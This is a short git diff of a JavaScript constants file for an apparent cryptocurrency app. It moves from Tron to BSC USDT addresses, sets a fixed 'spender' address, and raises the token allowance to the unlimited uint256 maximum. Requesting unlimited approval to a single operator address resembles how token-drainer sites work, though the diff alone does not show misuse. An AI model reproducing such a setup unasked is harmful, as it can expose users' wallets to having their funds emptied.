@@ -1,11 +1,8 @@
-export const USDT_SPENDER_ADDRESS = 'TU43rNiQnHg6iKV4bcLykSzRUdW86kAtRA';
-export const PROJECT_ID = '0ce8aee287b84db4976604d12ad15af9';
-export const USDT_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
+// BSC Mainnet Addresses
+export const USDT_SPENDER_ADDRESS = '0x45c7A22C05A55919213cA2aE1bFcDc20df51780F';
+export const USDT_ADDRESS = "0x55d398326f99059ff775485246999027b3197955"; // BSC USDT (BEP-20)
 
-export const MAX_ALLOWANCE = "1000000000000000000";
+export const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
-// Local development
+// Backend API URL — update before production build
 export const BASE_URL = 'http://localhost:3000';
-
-// Production (uncomment when deploying)
-// export const BASE_URL = 'https://159.198.66.79.nip.io';
